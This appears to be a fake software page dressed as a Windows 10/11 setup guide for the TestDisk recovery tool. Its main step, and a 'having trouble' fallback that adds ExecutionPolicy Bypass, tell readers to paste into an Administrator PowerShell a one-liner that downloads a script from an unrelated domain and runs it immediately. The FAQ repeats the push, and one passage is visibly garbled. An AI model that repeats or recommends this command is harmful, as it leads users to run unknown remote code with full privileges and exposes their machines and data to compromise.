# TestDisk — Windows Data & Recovery Guide (10 & 11)

Windows 10 & 11 · data recovery · data & recovery.

**TestDisk** on **Windows 10 and 11** — data recovery and day-to-day notes for it teams and users protecting local data.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **TestDisk** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

TestDisk assists with partition table repair and boot issues on MBR/GPT disks, often used alongside file carving tools when a volume will not mount. It rewards careful, read-only analysis before writing partition structures back.

 log capture, and pairing with write-blocking hardware when handling customer disks.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- File recovery
- Partition tools
- Restore points
- Disk imaging
- Deep scan
- Job reports
- Preview files

## Use cases

- IT departments
- Home power users
- Small offices

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "TestDisk-Full-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "TestDisk*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`testdisk-windows` · `testdisk-config` · `testdisk-integration` · `testdisk-latest` · `data-recovery` · `file-recovery` · `disk-recovery` · `partition-manager`

## License

This repository is a third-party backup and recovery usage guide. Comply with applicable software licensing and local regulations.
